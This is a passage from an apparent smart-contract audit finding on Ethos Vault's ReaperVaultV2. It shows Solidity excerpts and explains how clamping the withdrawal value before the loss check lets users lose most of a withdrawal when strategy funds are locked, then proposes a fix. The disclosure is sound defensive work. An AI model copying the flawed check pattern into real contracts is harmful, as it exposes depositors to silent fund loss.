class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> &lt;= ((</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Withdraw loss exceeds slippage&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Each strategy can return less than <code>requested - loss</code> as some funds can be temporary frozen:</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L90-L103\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L90-L103</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Withdraws funds and sends them back to the vault. Can only</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     *      be called by the vault. _amount must be valid and security fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     *      is deducted up-front.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only vault can withdraw&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Ammount must be less than balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_liquidatePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The invariant there is <code>liquidatedAmount + loss &#x3C;= _amountNeeded</code>, so <code>liquidatedAmount + loss &#x3C; _amountNeeded</code> is a valid state (due to the funds locked):</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L230-L243\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L230-L243</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * Liquidate up to </span><span class=\"mtk8\">`_amountNeeded`</span><span class=\"mtk3\"> of </span><span class=\"mtk8\">`want`</span><span class=\"mtk3\"> of this strategy&#39;s positions,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * irregardless of slippage. Any excess will be re-invested with </span><span class=\"mtk8\">`_adjustPosition()`</span><span class=\"mtk3\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * This function should return the amount of </span><span class=\"mtk8\">`want`</span><span class=\"mtk3\"> tokens made available by the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * liquidation. If there is a difference between them, </span><span class=\"mtk8\">`loss`</span><span class=\"mtk3\"> indicates whether the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * difference is due to a realized loss, or if there is some other sitution at play</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * (e.g. locked funds) where the amount made available is less than what is needed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * NOTE: The invariant </span><span class=\"mtk8\">`liquidatedAmount + loss &lt;= _amountNeeded`</span><span class=\"mtk3\"> should always be maintained</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_liquidatePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountNeeded</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatedAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><code>_liquidatePosition()</code> is called in strategy withdraw():</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L90-L103\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L90-L103</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Withdraws funds and sends them back to the vault. Can only</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     *      be called by the vault. _amount must be valid and security fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     *      is deducted up-front.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only vault can withdraw&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Ammount must be less than balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_liquidatePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountFreed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This way there can be <code>lockedAmount = _amountNeeded - (liquidatedAmount + loss) >= 0</code>, which is neither a loss, nor withdraw-able at the moment.</p>\n<p>As ReaperVaultV2’s <code>_withdraw()</code> updates <code>value</code> per <code>if (value > vaultBalance) {value = vaultBalance;}</code>, the following <code>totalLoss &#x3C;= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR</code> check do not control for the real loss and allows user to lose up to the whole amount due as <code>_withdraw()</code> first burns the full amount of the <code>_shares</code> requested and this total loss check for the <em>rebased</em> <code>value</code> is the only guard in place:</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L359-L412\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L359-L412</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> &lt;= ((</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Withdraw loss exceeds slippage&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Suppose there is only one strategy and <code>90</code> of the <code>100</code> tokens requested is locked at the moment, and there is no loss, just a temporal liquidity squeeze. Say there is no tokens on the vault balance before strategy withdrawal.</p>\n<p>ReaperBaseStrategyv4’s <code>withdraw()</code> will transfer <code>10</code>, report <code>0</code> loss, <code>0 = totalLoss &#x3C;= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR = (10 + 0) * withdrawMaxLoss / PERCENT_DIVISOR</code> check will be satisfied for any viable <code>withdrawMaxLoss</code> setting.</p>\n<p>Bob the withdrawing user will receive <code>10</code> tokens and have <code>100</code> tokens worth of the shares burned.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider rewriting the controlling logic so the check be based on initial value:</p>\n<p>Now:</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L399-L407\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L399-L407</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> &lt;= ((</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Withdraw loss exceeds slippage&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span></code></pre>\n<p>To be, as an example, if treat the loss attributed to the current user only as they have requested the withdrawal:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\"> &lt;= (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Withdraw loss exceeds slippage&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">totalLoss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    